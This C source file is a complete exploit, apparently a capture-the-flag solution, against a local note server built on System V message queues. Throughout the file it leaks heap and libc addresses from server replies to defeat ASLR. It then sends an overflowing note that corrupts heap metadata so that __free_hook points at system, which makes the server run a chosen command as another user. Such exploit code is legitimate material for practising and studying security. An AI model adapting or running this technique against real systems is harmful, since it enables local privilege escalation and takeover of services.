#include <sys/msg.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define MAIN_QUEUE_KEY 1337
#define MSGTYPE_TOSERVER 1
#define MSGTYPE_TOCLIENT 2

#define SUBTYPE_SUBMIT_NOTE 3
#define SUBTYPE_GET_COUNT 2
#define SUBTYPE_PING 4

#define SUBTYPE_REPLY_FAIL 1
#define SUBTYPE_REPLY_SUCCESS 0

#define MAX_USERMSG_BODY_SIZE 0x100
#define MAX_ALLOWED_NOTES 1000

#define SERVER_UID 1002

typedef struct favorites_s {
    struct favorites_s *next;
    char *str;
} favorite;

typedef struct main_queue_msg_s {
    long mtype;
    unsigned long sess_id;
    key_t queue_id;
} main_queue_msg;

typedef struct  {
    long mtype;
    unsigned char msubtype;
    unsigned long body_len;
    char body[];
} user_queue_msg;

int process_user_queue_msg(key_t msgq, user_queue_msg *msg);
unsigned long get_leaked_bytes(user_queue_msg *msg);

favorite *cool_notes;
unsigned long cool_notes_count;
int dummy_queues[10];
int main_queue;
int our_queue;

void send_note(key_t msgq, char *note) {
    size_t size = sizeof(user_queue_msg) + strlen(note);
    user_queue_msg *m = malloc(size);
    m->mtype = MSGTYPE_TOSERVER;
    m->msubtype = SUBTYPE_SUBMIT_NOTE;
    m->body_len = strlen(note);
    strcpy(m->body, note);
    int result = msgsnd(msgq, m, size, 0);
    printf("[+] sent note (size=%lu bodysize=%lu retval=%d)\n", size, strlen(note), result);
}

int register_queue(int main_queue, int offset) {
    key_t our_key = (key_t)getpid() + offset;
    int our_queue = msgget(our_key, IPC_CREAT);
    if (our_queue == -1) {
        printf("msgget failed\n");
        return -1;
    }

    struct msqid_ds msq_config;
    msq_config.msg_perm.uid = SERVER_UID;
    msq_config.msg_perm.gid = 0;
    msq_config.msg_perm.mode = 0600;
    msq_config.msg_qbytes = 0x1000; // idk, big enough

    /* Need to grant the other process access to our queue */
    msgctl(our_queue, IPC_SET, &msq_config);

    /* Register ourselves */
    /* the session id is /tmp/xx */
    main_queue_msg msg = { 1, 0x78782f706d742f, our_queue };
    int result = msgsnd(main_queue, &msg, sizeof(msg), 0);
    if (result == -1) return result;
    usleep(500);

    printf("[+] Successful register %d\n", our_queue);
    return our_queue;
}

void deregister(key_t key, key_t main_queue)  {
    /* Deregister ourselves */
    main_queue_msg msg = { 2, 0x0, key };
    int result = msgsnd(main_queue, &msg, sizeof(msg), 0);
    printf("[+] Successful deregister %d\n", result);
    sleep(1);
}
int main() {
    int msg_queue = msgget(MAIN_QUEUE_KEY, 0);
    if (msg_queue == -1) {
        printf("msgget failed\n");
        return -1;
    }

    our_queue = register_queue(msg_queue, 0);
    if (our_queue == -1) {
        printf("failed to register\n");
        return -1;
    }

    dummy_queues[0] = register_queue(msg_queue, 1);
    dummy_queues[1] = register_queue(msg_queue, 2);
    dummy_queues[2] = register_queue(msg_queue, 3);
    dummy_queues[3] = register_queue(msg_queue, 4);
    dummy_queues[4] = register_queue(msg_queue, 5);
    dummy_queues[5] = register_queue(msg_queue, 6);
    printf("Successfully registered (retval=%d)\n", our_queue);

    send_note(our_queue, "Hack the planet!");

    // This loop services our message queue
    while (1) {
        user_queue_msg recvd;
        ssize_t num_bytes = msgrcv(our_queue, &recvd, sizeof(user_queue_msg), MSGTYPE_TOCLIENT, MSG_NOERROR);
        if (num_bytes > 0) {
            process_user_queue_msg(our_queue, &recvd);
        }
    }
}

struct payload {
    unsigned long pad[3];
    unsigned long size;
    unsigned long next;
    unsigned long pad2;
};
void pwn(key_t msgq, unsigned long heap_leak, unsigned long libc_leak) {
    user_queue_msg *m = malloc(0x100);
    m->mtype = MSGTYPE_TOSERVER;
    m->msubtype = SUBTYPE_SUBMIT_NOTE;
    m->body_len = 0x10;

    struct payload *p = (struct payload *)m->body;

    //unsigned long chunk_addr = heap_leak + 0x590;
    unsigned long free_hook = libc_leak + 0xd9648;
    printf("[i] free_hook: %lx\n", free_hook);
    //printf("[i] chunk: %lx\n", chunk_addr);
    //unsigned long safe_target = free_hook ^ (chunk_addr >> 12);
    struct payload pay = { {0xdeadbeefdeadbeef, 0xdeadbeefdeadbeef, 0xdeadbeefdeadbeef}, 0x2121212121212121, free_hook, 0xf00dface };
    *p = pay;
    int result = msgsnd(msgq, m, sizeof(user_queue_msg) + 0x60, 0);
    printf("[+] Sent exploit note (retval=%d)\n", result);
}

unsigned long libc_leak;
unsigned long heap_leak;
int process_user_queue_msg(key_t msgq, user_queue_msg *msg) {
    if (msg->msubtype == SUBTYPE_REPLY_SUCCESS) {
        static int exploited = 0;
        printf("[=] Reply: Success\n");
        unsigned long leak = get_leaked_bytes(msg);
        if (exploited == 0) {
            send_note(our_queue, "Hack the planet again!");
            exploited = 1;
        } else if (exploited == 1) {
            deregister(dummy_queues[5], main_queue);
            send_note(our_queue, "Hack the planet again!");
            heap_leak = leak;
            exploited = 2;
        } else if (exploited == 2) {
            deregister(dummy_queues[1], main_queue);
            deregister(dummy_queues[3], main_queue);
            deregister(dummy_queues[2], main_queue);
            deregister(dummy_queues[0], main_queue);
            exploited = 3;
            sleep(5);
            libc_leak = leak;
            pwn(msgq, heap_leak, libc_leak);
        } else if (exploited == 3) {
            // Now we have both a libc and heap leak
            // tbh i didn't bother looking into WHY these specific addresses appear there under
            // certain circumstances
            unsigned long system = leak - 0xc3570;
            printf("[+] system: %lx\n", system);
            send_note(our_queue, (char*)&system);
            exploited = 4;
        } else if (exploited == 4) {
            printf("[+] It's time!\n");
            deregister(dummy_queues[4], main_queue);
            exploited = 5;
        }
    } else if (msg->msubtype == SUBTYPE_REPLY_FAIL) {
        printf("[x] Reply: Failed\n");
    }

    return -1;
}

unsigned long get_leaked_bytes(user_queue_msg *msg) {
    char *m = (char*)msg;
    unsigned long leak = (*(unsigned long *)(m + 9) & (0xffffffffffffffULL)) << 8;
    printf("[+] ASLR: %lx\n", leak);
    return leak;
}

